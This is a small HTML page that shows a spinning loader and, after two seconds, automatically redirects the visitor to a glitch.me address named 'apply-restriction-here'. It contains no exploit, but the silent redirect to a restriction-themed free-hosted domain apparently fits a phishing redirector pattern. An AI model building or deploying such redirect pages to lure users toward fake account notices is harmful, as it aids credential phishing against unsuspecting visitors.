<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirect Loader</title>
<style>
  /* Style for loader */
  .loader {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-color: rgba(255, 255, 255, 0.8); /* Light blue background */
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .loader::after {
    content: '';
    width: 50px;
    height: 50px;
    border: 6px solid #3498db; /* Blue border */
    border-radius: 50%;
    border-top: 6px solid transparent; /* Transparent top border */
    animation: spin 1s linear infinite; /* Spin animation */
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }
</style>
</head>
<body>

<!-- Loader HTML -->
<div class="loader"></div>

<script>
  // Wait for the page to load
  window.onload = function() {
    // Simulate a delay before redirecting (in milliseconds)
    var delay = 2000; // 2 seconds

    // After the delay, redirect to the specified URL
    setTimeout(function() {
      window.location.href = "https://apply-restriction-here.glitch.me/"; // Replace "https://example.com" with the URL you want to redirect to
    }, delay);
  };
</script>

</body>
</html>
